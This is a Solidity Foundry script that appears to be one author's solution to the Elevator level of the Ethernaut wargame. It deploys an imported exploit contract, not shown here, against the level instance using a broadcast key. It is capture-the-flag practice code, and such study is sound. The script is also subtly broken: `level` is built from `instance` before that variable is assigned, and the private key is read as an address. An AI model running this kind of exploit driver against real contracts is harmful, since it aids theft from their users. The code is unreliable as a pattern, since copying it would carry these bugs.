// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Elevator} from "src/11/Elevator.sol";
import {ElevatorExploit} from "src/11/ElevatorExploit.sol";


contract Exploit is Script {

        Elevator level = Elevator(instance);  
        ElevatorExploit public exploit;
        address instance = vm.envAddress("INSTANCE_LEVEL11");
        address hacker = vm.envAddress("PRIVATE_KEY");
        
        function run() external {

            vm.startBroadcast(hacker);
            exploit = new ElevatorExploit();
            exploit.run(level);
            vm.stopBroadcast();
    }
}
